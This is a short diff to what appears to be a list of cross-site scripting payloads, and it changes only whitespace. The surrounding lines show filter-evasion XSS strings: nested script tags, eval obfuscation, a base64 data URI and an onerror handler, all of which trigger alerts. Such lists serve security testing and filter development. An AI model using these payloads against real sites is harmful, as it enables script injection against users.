@@ -133,8 +133,7 @@ alert;pg("XSS")
 <script>for((i)in(self))eval(i)(1)</script>
 <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
-
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>  
 <script>eval('al'+'ert(1)');</script>  
 <script>'alert(1)'.replace(/.+/,eval)</script>  
 <img onerror=eval('al\u0065rt(1)') src=a>  
